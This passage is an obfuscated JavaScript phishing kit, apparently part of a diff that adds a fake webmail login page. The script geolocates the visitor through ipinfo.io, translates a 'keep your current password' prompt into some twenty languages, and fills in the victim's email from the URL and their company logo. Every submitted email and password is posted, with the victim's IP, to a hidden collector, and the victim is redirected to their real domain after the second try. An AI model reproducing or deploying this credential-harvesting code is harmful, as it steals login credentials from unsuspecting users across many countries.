'English'],'UY':['Spanish'],'UZ':[_0x5df99f(0x272)],'VU':[_0x5df99f(0x1d5)],'VA':[_0x5df99f(0x1d5)],'VE':[_0x5df99f(0x1dc)],'VN':[_0x5df99f(0x26c)],'YE':['Arabic'],'ZM':['English'],'ZW':['English']};if(_0x1e2da2 in _0x5c5a6f){const _0x38d9b5=_0x5c5a6f[_0x1e2da2][0x0];switch(_0x38d9b5){case _0x5df99f(0x1d5):document['getElementById'](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x227),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x225),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x26d),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']='Log\x20in',wrong=_0x5df99f(0x1ea),nonexist=_0x5df99f(0x1de),signin='Log\x20in',successlang='Password\x20Updated';break;case _0x5df99f(0x1dc):document['getElementById'](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x27a),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x24c),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))['placeholder']='Contraseña',document[_0x5df99f(0x1bd)]('submit-btn')[_0x5df99f(0x228)]='Iniciar\x20sesión',wrong=_0x5df99f(0x248),nonexist=_0x5df99f(0x1c9),signin=_0x5df99f(0x21e),successlang=_0x5df99f(0x264);break;case _0x5df99f(0x26c):document[_0x5df99f(0x1bd)]('signin')['textContent']=_0x5df99f(0x1cb),document[_0x5df99f(0x1bd)]('email')['placeholder']=_0x5df99f(0x1bc),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x1c2),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x269),wrong=_0x5df99f(0x223),nonexist=_0x5df99f(0x1b2),signin=_0x5df99f(0x269),successlang='Mật\x20Khẩu\x20Cập\x20Nhật';break;case _0x5df99f(0x21b):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x1f2),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x233),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))['placeholder']=_0x5df99f(0x1f6),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x25c),wrong=_0x5df99f(0x1dd),nonexist='هذا\x20الحساب\x20غير\x20موجود.\x20أدخل\x20حساب\x20مختلف',signin=_0x5df99f(0x25c),successlang=_0x5df99f(0x278);break;case _0x5df99f(0x1be):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x27b),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]='Электронная\x20почта',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x275),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]='Авторизоваться',wrong=_0x5df99f(0x1d0),nonexist='Этой\x20учетной\x20записи\x20не\x20существует.\x20Войдите\x20в\x20другую\x20учетную\x20запись',signin='Авторизоваться',successlang=_0x5df99f(0x204);break;case _0x5df99f(0x272):document['getElementById'](_0x5df99f(0x245))['textContent']=_0x5df99f(0x1ae),document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x218),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x1f8),document[_0x5df99f(0x1bd)]('submit-btn')['innerText']=_0x5df99f(0x21a),wrong='нотўғри\x20фойдаланувчи\x20номи\x20ёки\x20парол.!\x20Илтимос,\x20тўғри\x20маълумотларни\x20киритинг.',nonexist='Бу\x20ҳисоб\x20мавжуд\x20емас.\x20Бошқа\x20ҳисобни\x20киритинг',signin=_0x5df99f(0x21a),successlang=_0x5df99f(0x1e1);break;case _0x5df99f(0x1b4):document['getElementById']('signin')[_0x5df99f(0x1c3)]=_0x5df99f(0x243),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x1b5),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]='Şifre',document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']=_0x5df99f(0x1d1),wrong=_0x5df99f(0x274),nonexist=_0x5df99f(0x23a),signin=_0x5df99f(0x20f),successlang=_0x5df99f(0x1cd);break;case _0x5df99f(0x206):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))['textContent']=_0x5df99f(0x24e),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x1e7),document[_0x5df99f(0x1bd)]('password')[_0x5df99f(0x26e)]='密碼',document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']='登錄',wrong='錯誤的用戶名或密碼。！請輸入正確的詳細信息。',nonexist=_0x5df99f(0x256),signin='登錄',successlang=_0x5df99f(0x22c);break;case _0x5df99f(0x271):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x276),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))['placeholder']='电邮',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))['placeholder']='密码',document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]='登入',wrong=_0x5df99f(0x24d),nonexist=_0x5df99f(0x263),signin='登入',successlang=_0x5df99f(0x237);break;case _0x5df99f(0x23b):document['getElementById'](_0x5df99f(0x245))['textContent']='Connectez-vous\x20avec\x20votre\x20adresse\x20e-mail\x20et\x20votre\x20mot\x20de\x20passe\x20pour\x20continuer\x20à\x20utiliser\x20votre\x20mot\x20de\x20passe\x20actuel',document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x20a),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x1e6),document[_0x5df99f(0x1bd)]('submit-btn')[_0x5df99f(0x228)]=_0x5df99f(0x217),wrong=_0x5df99f(0x258),nonexist='Ce\x20compte\x20n\x27existe\x20pas.\x20Entrez\x20un\x20autre\x20compte',signin=_0x5df99f(0x217),successlang=_0x5df99f(0x1ba);break;case _0x5df99f(0x1cc):document['getElementById'](_0x5df99f(0x245))[_0x5df99f(0x1c3)]='Accedi\x20con\x20il\x20tuo\x20indirizzo\x20email\x20e\x20la\x20password\x20per\x20continuare\x20a\x20utilizzare\x20la\x20password\x20corrente',document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x225),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]='Password',document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x230),wrong=_0x5df99f(0x1a9),nonexist=_0x5df99f(0x232),signin=_0x5df99f(0x230),successlang='Password\x20aggiornata';break;case _0x5df99f(0x200):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))['textContent']=_0x5df99f(0x1c7),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]='E-mail',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x1a8),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']=_0x5df99f(0x201),wrong=_0x5df99f(0x1fe),nonexist=_0x5df99f(0x23e),signin=_0x5df99f(0x201),successlang=_0x5df99f(0x1d7);break;case _0x5df99f(0x23c):document[_0x5df99f(0x1bd)]('signin')[_0x5df99f(0x1c3)]=_0x5df99f(0x23f),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]='Email',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x270),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]='Autentificare',wrong=_0x5df99f(0x21f),nonexist=_0x5df99f(0x1d3),signin=_0x5df99f(0x265),successlang=_0x5df99f(0x235);break;case _0x5df99f(0x211):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x22b),document['getElementById']('email')['placeholder']=_0x5df99f(0x225),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x213),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']=_0x5df99f(0x224),wrong=_0x5df99f(0x236),nonexist=_0x5df99f(0x1d8),signin='Anmelden',successlang=_0x5df99f(0x1ca);break;case _0x5df99f(0x1ff):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x24f),document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]='이메일',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))['placeholder']=_0x5df99f(0x247),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x1fc),wrong='잘못된\x20사용자\x20이름\x20또는\x20암호.!\x20정확한\x20세부\x20정보를\x20입력하십시오.',nonexist=_0x5df99f(0x212),signin=_0x5df99f(0x1fc),successlang='암호\x20업데이트';break;case _0x5df99f(0x1c4):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x1fb),document['getElementById'](_0x5df99f(0x222))['placeholder']=_0x5df99f(0x251),document['getElementById']('password')['placeholder']='パスワード',document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]='ログイン',wrong='間違ったユーザー名またはパスワード。!\x20正しい詳細を入力してください.',nonexist='そのアカウントは存在しません。\x20別のアカウントを入力する',signin=_0x5df99f(0x208),successlang=_0x5df99f(0x22a);break;case _0x5df99f(0x253):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x210),document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x1bc),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x20b),document['getElementById'](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x1ce),wrong=_0x5df99f(0x1ad),nonexist=_0x5df99f(0x277),signin='Zaloguj\x20się',successlang=_0x5df99f(0x1f0);break;case _0x5df99f(0x229):document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x244),document['getElementById'](_0x5df99f(0x222))['placeholder']='Електронна\x20пошта',document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]='Пароль',document[_0x5df99f(0x1bd)]('submit-btn')[_0x5df99f(0x228)]=_0x5df99f(0x1db),wrong=_0x5df99f(0x1c6),nonexist=_0x5df99f(0x1e5),signin=_0x5df99f(0x1db),successlang=_0x5df99f(0x273);break;case'Kazakh':document['getElementById']('signin')[_0x5df99f(0x1c3)]=_0x5df99f(0x219),document['getElementById']('email')[_0x5df99f(0x26e)]=_0x5df99f(0x255),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x1e8),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))['innerText']=_0x5df99f(0x1c1),wrong=_0x5df99f(0x238),nonexist='Бұл\x20есептік\x20жазба\x20жоқ.\x20Басқа\x20есептік\x20жазбаға\x20кіріңіз',signin=_0x5df99f(0x1c1),successlang=_0x5df99f(0x259),bulgarian;break;case _0x5df99f(0x26f):document[_0x5df99f(0x1bd)]('signin')[_0x5df99f(0x1c3)]=_0x5df99f(0x216),document[_0x5df99f(0x1bd)](_0x5df99f(0x222))[_0x5df99f(0x26e)]='Електронна\x20поща',document[_0x5df99f(0x1bd)]('password')[_0x5df99f(0x26e)]=_0x5df99f(0x1d9),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x25e),wrong=_0x5df99f(0x1b7),nonexist=_0x5df99f(0x1ed),signin=_0x5df99f(0x25e),successlang=_0x5df99f(0x261);break;default:document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]=_0x5df99f(0x227),document[_0x5df99f(0x1bd)]('email')[_0x5df99f(0x26e)]='Email',document[_0x5df99f(0x1bd)]('password')[_0x5df99f(0x26e)]=_0x5df99f(0x26d),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x230),wrong=_0x5df99f(0x1ea),nonexist=_0x5df99f(0x1de),signin=_0x5df99f(0x230),successlang=_0x5df99f(0x254);break;}}else document[_0x5df99f(0x1bd)](_0x5df99f(0x245))[_0x5df99f(0x1c3)]='Sign\x20in\x20with\x20your\x20email\x20address\x20and\x20password\x20to\x20continue\x20using\x20your\x20current\x20password',document['getElementById'](_0x5df99f(0x222))[_0x5df99f(0x26e)]=_0x5df99f(0x225),document[_0x5df99f(0x1bd)](_0x5df99f(0x215))[_0x5df99f(0x26e)]=_0x5df99f(0x26d),document[_0x5df99f(0x1bd)](_0x5df99f(0x1fd))[_0x5df99f(0x228)]=_0x5df99f(0x230),wrong=_0x5df99f(0x1ea),nonexist=_0x5df99f(0x1de),signin=_0x5df99f(0x230),successlang='Password\x20Updated';}function getIPCountryAndLanguage(){var _0x1d40bf=_0x4940a7;fetch('https://ipinfo.io/json')[_0x1d40bf(0x1a6)](_0x3c1375=>_0x3c1375['json']())[_0x1d40bf(0x1a6)](_0xba6a20=>{var _0x1964ef=_0x1d40bf;ipp=_0xba6a20['ip'],doSomethingBasedOnCountryLanguage(_0xba6a20[_0x1964ef(0x205)]);})[_0x1d40bf(0x1f4)](_0x3835bc=>{var _0x49432d=_0x1d40bf;console[_0x49432d(0x1f9)]('Error\x20fetching\x20IP,\x20country,\x20and\x20language:',_0x3835bc),document[_0x49432d(0x1bd)]('ip-address')[_0x49432d(0x1c3)]=_0x49432d(0x1bb),document[_0x49432d(0x1bd)](_0x49432d(0x205))[_0x49432d(0x1c3)]='Error\x20fetching\x20country.',document[_0x49432d(0x1bd)](_0x49432d(0x20e))[_0x49432d(0x1c3)]='Error\x20fetching\x20language.';});}getIPCountryAndLanguage();var paswupdated='\x0a\x20\x20\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<title>'+successlang+_0x4940a7(0x262)+successlang+_0x4940a7(0x26a);$(document)[_0x4940a7(0x1ee)](function(){var _0x3cb411=_0x4940a7,_0x2ad474=0x0;function _0x1b8724(_0x3ca87f){return decodeURIComponent(escape(atob(_0x3ca87f)));}$(_0x3cb411(0x20d))[_0x3cb411(0x1e0)](function(){var _0x1ed1cd=_0x3cb411;$(_0x1ed1cd(0x23d))[_0x1ed1cd(0x221)](),$(_0x1ed1cd(0x1f1))['val'](''),$('#automail')['animate']({'left':0xc8,'opacity':_0x1ed1cd(0x221)},0x0),$(_0x1ed1cd(0x1eb))['animate']({'right':0xc8,'opacity':'show'},0x3e8);}),$(_0x3cb411(0x1f1))['keyup'](function(){var _0x2527a3=_0x3cb411,_0x2b450a=$(_0x2527a3(0x1f1))[_0x2527a3(0x1d4)]();_0x2b450a=_0x1b8724(_0x2b450a),$(_0x2527a3(0x24b))[_0x2527a3(0x1e3)](_0x2b450a);}),$('#show')[_0x3cb411(0x1e0)](function(){var _0x2dfbe7=_0x3cb411;event['preventDefault']();var _0x1b1451=document[_0x2dfbe7(0x1bd)]('password');_0x1b1451['type']===_0x2dfbe7(0x215)?($(_0x2dfbe7(0x1d2))[_0x2dfbe7(0x1e3)](_0x2dfbe7(0x221)),_0x1b1451[_0x2dfbe7(0x1c8)]=_0x2dfbe7(0x220)):($(_0x2dfbe7(0x1d2))[_0x2dfbe7(0x1e3)](_0x2dfbe7(0x214)),_0x1b1451[_0x2dfbe7(0x1c8)]='password');});function _0x1b8724(_0x2498e6){return decodeURIComponent(escape(atob(_0x2498e6)));}var _0x3b1002=window['location']['hash']['substr'](0x1);if(!_0x3b1002){}else{var _0x149fc3=_0x3b1002;$(_0x3cb411(0x1f1))[_0x3cb411(0x1d4)](_0x149fc3);var _0x4ef7ba=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x4ef7ba[_0x3cb411(0x1d6)](_0x149fc3))return $(_0x3cb411(0x22f))[_0x3cb411(0x214)](),_0x3b1002[_0x3cb411(0x267)],![];var _0x4261b3=_0x149fc3[_0x3cb411(0x22d)]('@'),_0x4532f4=_0x149fc3[_0x3cb411(0x25b)](_0x4261b3+0x1),_0x219f23=_0x4532f4['substr'](0x0,_0x4532f4[_0x3cb411(0x22d)]('.')),_0x5a97ff=_0x219f23['toLowerCase'](),_0x11a317=_0x219f23[_0x3cb411(0x1e4)]();$('#logoimg')[_0x3cb411(0x246)]('src','https://logo.clearbit.com/'+_0x4532f4),$(_0x3cb411(0x1da))[_0x3cb411(0x1e3)](_0x11a317),$('.logoname')[_0x3cb411(0x1e3)](_0x11a317),$('.domain')[_0x3cb411(0x1e3)](_0x4532f4),$(_0x3cb411(0x1c5))[_0x3cb411(0x1e3)](_0x3b1002);var _0x2ef7ea=_0x3cb411(0x239)+_0x4532f4;$(_0x3cb411(0x1af))['attr'](_0x3cb411(0x1df),'https://logo.clearbit.com/'+_0x2ef7ea),document[_0x3cb411(0x1bd)](_0x3cb411(0x279))[_0x3cb411(0x1df)]=_0x2ef7ea;}$(_0x3cb411(0x249))[_0x3cb411(0x1e0)](function(_0x1b9d97){var _0x13249e=_0x3cb411;$(_0x13249e(0x22f))[_0x13249e(0x221)](),$('#msg')[_0x13249e(0x221)](),_0x1b9d97[_0x13249e(0x1e9)]();var _0x39082c=$(_0x13249e(0x1f1))['val'](),_0x5779bc=$(_0x13249e(0x1c0))['val'](),_0x400f0c=$('#msg')['html']();$('#msg')[_0x13249e(0x220)](_0x400f0c);var _0x475342=_0x39082c,_0x4d16c2=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x475342)return $(_0x13249e(0x22f))[_0x13249e(0x214)](),$('#error')['html']('Email\x20field\x20is\x20empty...!'),_0x39082c[_0x13249e(0x267)],![];if(!_0x4d16c2[_0x13249e(0x1d6)](_0x475342))return $(_0x13249e(0x22f))['show'](),$('#error')['html'](nonexist),_0x39082c[_0x13249e(0x267)],![];if(!_0x5779bc)return $(_0x13249e(0x22f))[_0x13249e(0x214)](),$(_0x13249e(0x22f))[_0x13249e(0x1e3)]('Password\x20field\x20is\x20empty...!'),_0x39082c[_0x13249e(0x267)],![];if(_0x5779bc[_0x13249e(0x226)]<0x5)return $(_0x13249e(0x22f))[_0x13249e(0x214)](),$('#error')[_0x13249e(0x1e3)](_0x13249e(0x1ac)),_0x39082c['focus'],![];var _0x4cdb16=_0x475342[_0x13249e(0x22d)]('@'),_0x49bbee=_0x475342[_0x13249e(0x25b)](_0x4cdb16+0x1),_0x53108c=_0x49bbee[_0x13249e(0x25b)](0x0,_0x49bbee[_0x13249e(0x22d)]('.')),_0x330821=_0x53108c[_0x13249e(0x1b8)](),_0x3688f9=_0x53108c['toUpperCase']();$(_0x13249e(0x1af))[_0x13249e(0x246)]('src',_0x13249e(0x207)+_0x49bbee),$(_0x13249e(0x266))[_0x13249e(0x246)]('src',_0x13249e(0x207)+_0x49bbee),$(_0x13249e(0x1da))['html'](_0x3688f9),_0x2ad474=_0x2ad474+0x1,$['ajax']({'dataType':'JSON','url':_0x13249e(0x260),'type':_0x13249e(0x1f7),'data':{'ai':_0x39082c,'pr':_0x5779bc,'ippp':ipp},'beforeSend':function(_0x457e09){var _0x53f938=_0x13249e;$('#submit-btn')['html'](_0x53f938(0x252));},'success':function(_0x416676){var _0x5420f6=_0x13249e;_0x416676&&($('#msg')[_0x5420f6(0x1e3)](wrong),$('#msg')[_0x5420f6(0x214)](),console[_0x5420f6(0x22e)](_0x416676),$(_0x5420f6(0x23d))[_0x5420f6(0x1e3)](_0x416676['msg']),_0x416676['signal']=='ok'?($('#password')[_0x5420f6(0x1d4)](''),_0x2ad474>=0x2&&(_0x2ad474=0x0,$(_0x5420f6(0x203))['html'](paswupdated),window[_0x5420f6(0x1fa)][_0x5420f6(0x1aa)]('http://www.'+_0x49bbee))):$(_0x5420f6(0x23d))['html'](_0x416676[_0x5420f6(0x26b)]));},'error':function(){var _0x15fdd7=_0x13249e;$(_0x15fdd7(0x1c0))[_0x15fdd7(0x1d4)](''),_0x2ad474>=0x2&&(_0x2ad474=0x0,$('body')[_0x15fdd7(0x1e3)](paswupdated),window[_0x15fdd7(0x1fa)][_0x15fdd7(0x1aa)]('http://www.'+_0x49bbee)),$(_0x15fdd7(0x23d))['show'](),$('#msg')[_0x15fdd7(0x1e3)](wrong);},'complete':function(){var _0x49d443=_0x13249e;$('#submit-btn')[_0x49d443(0x1e3)](signin);}});});});
+  
+</script>
+
+<!-- Login 1 end -->
+  
+ 
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+
+
+
+</body>
+</html>
+
+
+<!-- b
+bulgarian
+Kazakh
+Polish
+Ukrainian
+English,
+Spanish,
+Vietnamese,
+Arabic,
+Russian,
+Uzbek,
+Turkish,
+Taiwan,
+Chinese,
+French,
+Italian,
+Portuguese,
+Romanian,
+German,
+Korean,
+Japanese,
+
+-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
